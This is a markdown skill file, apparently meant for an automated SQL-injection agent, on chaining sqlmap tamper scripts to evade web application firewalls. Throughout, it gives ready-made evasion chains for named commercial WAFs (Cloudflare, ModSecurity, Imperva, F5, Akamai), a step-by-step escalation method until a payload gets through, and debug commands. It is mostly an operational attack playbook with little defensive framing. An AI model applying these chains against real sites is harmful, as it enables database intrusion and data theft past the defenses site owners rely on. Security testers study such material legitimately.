# Skill: Tamper Chaining

## Metadata
- Phase: waf_evasion
- Techniques: all
- DB Targets: all
- Risk Level: medium
- Prerequisites: single tampers insufficient, WAF partially bypassed

## When to Use

Use when single tamper scripts are insufficient to bypass the WAF. Chaining applies multiple transformations in sequence, creating complex payloads that evade multi-rule WAFs. Order matters — transformations are applied left to right.

## Chaining Syntax

```bash
# Comma-separated, applied LEFT TO RIGHT
--tamper=tamper1,tamper2,tamper3
```

Example chain processing:
```
Original:  SELECT * FROM users WHERE id=1
+space2comment:  SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1
+randomcase:  SeLeCt/**/*/**/FrOm/**/uSeRs/**/WhErE/**/iD=1
+charencode:  %53%65%4c%65%43%74/**/*/**/...
```

## Pre-Tested WAF Chains

### Cloudflare
```bash
--tamper=space2comment,randomcase,charencode
```
Chain file: `tamper/chains/cloudflare_chain.txt`

### ModSecurity (CRS)
```bash
# MySQL target
--tamper=modsecurityzeroversioned,space2comment,randomcase

# Generic
--tamper=space2comment,randomcase,between,charencode
```
Chain file: `tamper/chains/modsecurity_chain.txt`

### Imperva Incapsula
```bash
--tamper=space2comment,randomcase,between,greatest,charencode
```
Chain file: `tamper/chains/imperva_chain.txt`

### F5 BIG-IP ASM
```bash
--tamper=randomcase,charencode,space2randomblank
```

### Akamai
```bash
--tamper=between,chardoubleencode,randomcase,space2comment
```

### Unknown/Generic WAF
```bash
# Start conservative
--tamper=space2comment,randomcase

# If blocked, escalate
--tamper=between,space2comment,randomcase,charencode

# Maximum evasion
--tamper=between,charencode,space2comment,randomcase,apostrophemask,greatest
```

## Chain Building Strategy

### Rule 1: Space replacement first
Always put space tampers near the start:
```bash
--tamper=space2comment,randomcase
#         ^first          ^second
```

### Rule 2: Encoding last
Encoding tampers should come last (they encode everything including previous transformations):
```bash
--tamper=space2comment,randomcase,charencode
#         ^transform     ^transform  ^encode last
```

### Rule 3: DBMS-specific in the middle
Put DBMS-specific tampers between generic transforms:
```bash
--tamper=space2comment,modsecurityzeroversioned,randomcase
```

### Rule 4: Avoid redundant tampers
Don't combine `charencode` and `chardoubleencode` — pick one.
Don't combine `space2comment` and `space2dash` — pick one space replacement.

## Incremental Chaining Method

Test incrementally to find minimum effective chain:

```bash
# Step 1: Baseline
sqlmap -u "TARGET" --batch  # blocked

# Step 2: Add space replacement
sqlmap -u "TARGET" --tamper=space2comment --batch  # blocked

# Step 3: Add case randomization
sqlmap -u "TARGET" --tamper=space2comment,randomcase --batch  # blocked

# Step 4: Add encoding
sqlmap -u "TARGET" --tamper=space2comment,randomcase,charencode --batch  # SUCCESS
```

## Debug: Viewing Chain Output

```bash
# See the final payload after all tampers applied
sqlmap -u "TARGET" \
  --tamper=space2comment,randomcase,charencode \
  -v 5 \
  --batch \
  --technique=E  # Error-based easiest to debug
```

## Advanced: Custom Chain Order for Specific WAFs

Some WAFs inspect decoded payloads. Order matters:

```bash
# WAF decodes URL first -> encode AFTER obfuscation
--tamper=between,randomcase,charencode  # Correct order

# Wrong: encoding first, then readable obfuscation
--tamper=charencode,between,randomcase  # WAF may decode, then detect 'between'
```

## Load Chain from File

```bash
# Use pre-built chain from chains/ directory
CHAIN=$(cat tamper/chains/cloudflare_chain.txt)
sqlmap -u "TARGET" --tamper="$CHAIN" --batch
```

## Red Flags (wrong skill)
- Long chain but still blocked -> WAF uses behavioral/ML detection, manual crafting needed
- Chain causes SQL syntax errors -> incompatible tamper combination, check DBMS compatibility
- Chain slows down too much -> reduce chain length, use only essential tampers

## Follow-Up
- Chain working -> [Quick Scan](../01_detection/quick_scan.md) with chain applied
- Still blocked -> [Encoding Strategies](encoding_strategies.md) for advanced evasion
- Need to test against specific WAF -> use `configs/waf_*.cfg` profiles
